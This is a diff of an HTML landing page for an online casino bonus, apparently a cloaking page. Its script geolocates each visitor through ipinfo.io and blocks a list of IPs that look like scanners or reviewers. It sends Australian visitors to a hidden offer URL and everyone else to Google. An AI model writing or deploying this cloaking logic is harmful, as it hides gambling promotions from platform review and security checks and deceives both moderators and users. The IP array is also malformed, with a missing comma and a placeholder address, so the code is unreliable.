@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ReefSpins Casino</title>
+    <title>ReefSpins Bonus</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.0/jquery.js" integrity="sha512-cEgdeh0IWe1pUYypx4mYPjDxGB/tyIORwjxzKrnoxcif2ZxI7fw81pZWV0lGnPWLrfIHGA7qc964MnRjyCYmEQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 
     <script>
@@ -11,7 +11,7 @@
         const allowedCountries = ['AU']; // Only allow Australia (AU)
 
         // Define blocked IP addresses
-        const blockedIPs = [
+         const blockedIPs = [
             "185.18.222.147", "103.17.196.155", "198.44.133.53", "138.199.22.183", "106.161.65.206",
             "54.200.5.221", "35.89.14.236", "104.210.79.75", "35.88.70.185", "96.0.0.81",
             "20.28.16.4", "104.28.108.0", "16.50.232.14", "173.239.194.27", "217.64.126.104",
@@ -20,15 +20,12 @@
             "154.16.81.84" "34.235.48.77", "54.156.251.192", "149.154.161.xxx",
         ];
 
-        // Add your token here from ipinfo.io
-        const token = "396ec7a7e34187";
+        $.get('https://ipinfo.io/json', function(data) {  
+            const ipAddress = data.ip;  // Extract the IP address  
+            const country = data.country;  // Extract the country code  
 
-        $.get(`https://ipinfo.io/json?token=${token}`, function(data) {
-            const ipAddress = data.ip;  // Extract the IP address
-            const country = data.country;  // Extract the country code
-
-            console.log("IP Address:", ipAddress);
-            console.log("Country:", country);
+            console.log("IP Address:", ipAddress);  
+            console.log("Country:", country);  
 
             // Block IP addresses
             if (blockedIPs.includes(ipAddress)) {
@@ -38,17 +35,20 @@
             }
 
             // Check if the country is allowed
-            if (allowedCountries.includes(country)) {
-                console.log("Access allowed for country:", country);
+            if (allowedCountries.includes(country)) {    
+                console.log("Access allowed for country:", country);    
                 window.location.replace("https://www.sehigh.com/DZRZX6W/2DZTNR69/"); // Redirect to the offer for allowed countries
-            } else {
-                console.log("Access denied for country:", country);
+            } else {    
+                console.log("Access denied for country:", country);    
                 window.location.replace("https://google.com"); // Redirect to Google for other countries
             }
-        }).fail(function(error) {
-            console.error('Error:', error);
+        }).fail(function(error) {  
+            console.error('Error:', error);  
             window.location.replace("https://google.com"); // If there's an error, redirect to Google
         });
     </script>
 </head>
+<body>
+
+</body>
 </html>
